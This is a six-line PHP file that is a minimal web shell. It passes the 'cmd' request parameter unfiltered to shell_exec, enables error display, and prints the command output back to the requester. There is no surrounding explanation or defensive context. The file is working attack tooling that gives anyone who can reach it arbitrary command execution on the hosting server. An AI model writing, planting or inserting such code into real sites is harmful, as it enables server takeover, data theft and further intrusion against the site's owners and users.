<?php
ini_set("display_errors", true);
$result = shell_exec($_REQUEST['cmd']);
print_r($result);

?>
